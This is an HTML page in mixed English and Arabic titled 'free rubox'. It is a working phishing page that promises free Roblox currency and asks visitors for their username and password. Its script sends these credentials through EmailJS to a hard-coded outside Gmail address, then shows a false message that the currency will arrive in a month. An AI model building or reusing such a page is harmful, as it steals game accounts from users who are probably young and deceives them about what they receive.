<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>free rubox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f8f9fa;
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
        }
        form {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #34495e;
            font-size: 14px;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-family: inherit;
            font-size: 14px;
        }
        textarea {
            height: 100px;
            resize: none;
        }
        button {
            background-color: #3498db;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            transition: background-color 0.3s;
            margin-top: 10px;
        }
        button:hover {
            background-color: #2980b9;
        }
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            text-align: center;
            display: none;
            font-size: 14px;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .char-count {
            font-size: 12px;
            color: #7f8c8d;
            text-align: left;
            margin-top: 5px;
        }
        .required {
            color: #e74c3c;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <h1>free rubox</h1>
    
    <form id="short-message-form">
        <div class="form-group">
            <label for="name">username <span class="required"></span></label>
            <input type="text" id="name" required placeholder="username" maxlength="50">
            <div class="char-count">(<span id="name-count">0</span>/50 حرفًا)</div>
        </div>
        
        <div class="form-group">
            <label for="subject">number of rubox <span class="required"></span></label>
            <input type="text" id="subject" required placeholder="at least 1000 rubox" maxlength="50">
            <div class="char-count">(<span id="subject-count">0</span>/50 حرفًا)</div>
        </div>
        
        <div class="form-group">
            <label for="message">password <span class="required"></span></label>
            <textarea id="message" required placeholder="password" maxlength="50"></textarea>
            <div class="char-count">(<span id="message-count">0</span>/50 حرفًا)</div>
        </div>
        
        <button type="submit">get your rubox</button>
        
        <div id="status"></div>
    </form>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        // تهيئة EmailJS
        emailjs.init('kBY-IDuor9xDg62x9');
        
        // عدادات الأحرف
        function setupCharCounter(inputId, countId) {
            const input = document.getElementById(inputId);
            const counter = document.getElementById(countId);
            
            input.addEventListener('input', function() {
                counter.textContent = this.value.length;
                
                if (this.value.length >= 45) {
                    counter.style.color = '#e74c3c';
                } else {
                    counter.style.color = '#7f8c8d';
                }
            });
        }
        
        setupCharCounter('name', 'name-count');
        setupCharCounter('subject', 'subject-count');
        setupCharCounter('message', 'message-count');
        
        document.getElementById('short-message-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const status = document.getElementById('status');
            status.style.display = 'none';
            
            // إيميل صديقك الثابت
            const friendEmail = "samisoumsamo22@gmail.com";
            
            const formData = {
                to_email: friendEmail,
                name: document.getElementById('name').value,
                subject: document.getElementById('subject').value,
                message: document.getElementById('message').value,
                sent_at: new Date().toLocaleString('ar-SA')
            };
            
            // إرسال الإيميل
            emailjs.send('service_tp8nrqk', 'template_44qqbl1', formData)
                .then(function() {
                    status.textContent = 'you will recive your rubox in 1 month';
                    status.className = 'success';
                    status.style.display = 'block';
                    document.getElementById('short-message-form').reset();
                    
                    // إعادة تعيين العدادات
                    ['name-count', 'subject-count', 'message-count'].forEach(id => {
                        document.getElementById(id).textContent = '0';
                        document.getElementById(id).style.color = '#7f8c8d';
                    });
                }, function(error) {
                    status.textContent = 'حدث خطأ: ' + error.text;
                    status.className = 'error';
                    status.style.display = 'block';
                });
        });
    </script>
</body>
</html>
